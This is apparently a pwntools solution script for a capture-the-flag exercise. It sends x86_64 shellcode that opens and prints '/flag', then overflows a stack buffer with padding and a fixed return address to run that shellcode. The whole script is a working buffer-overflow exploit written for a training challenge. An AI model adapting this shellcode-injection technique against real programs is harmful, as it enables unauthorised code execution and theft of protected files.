from pwn import *
file = "/challenge/toddlerone_level1.1"
shellcodeaddr = p64(0x1eb13000)
retaddr = 88
shellcode = ("""
xor rax, rax
xor r10, r10
xor rdx, rdx
xor rdi, rdi
xor rsi, rsi
mov rax, 2
lea rdi, [rip+flag]
syscall
mov rsi, rax
xor rdi, rdi
mov rdi, 1
mov rax, 40
mov r10, 100
syscall

flag:
    .string "/flag"
""")



shellbytes = asm(shellcode, os='linux', arch='x86_64')

p = process(file)
p.sendline(shellbytes)
p.sendline(bytes(str(retaddr + 9), 'ascii'))
p.sendline(b'A'*retaddr + shellcodeaddr + b'\n')
print(p.recvall(timeout=0.1))
